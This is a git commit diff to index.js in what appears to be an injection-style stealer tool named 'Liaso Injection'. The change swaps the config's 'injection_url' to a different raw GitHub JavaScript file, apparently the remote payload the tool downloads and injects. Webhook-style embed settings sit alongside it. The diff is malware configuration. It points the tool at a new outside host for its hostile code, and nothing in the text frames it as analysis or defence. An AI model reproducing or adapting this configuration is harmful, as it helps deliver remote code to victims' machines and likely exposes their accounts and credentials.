0934a9b5838bb5bff5428bfc6ebad3903b2e6e2f
espiny <134323618+Espiny@users.noreply.github.com>
2023-08-06 11:39:07 +0200

    Update index.js

--- index.js
+++ index.js
@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Liaso Injection', 
   embed_icon: 'https://raw.githubusercontent.com/Espiny/Picture/main/image.png'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/Espiny/W/main/index.js', 
   /**
    
    **/
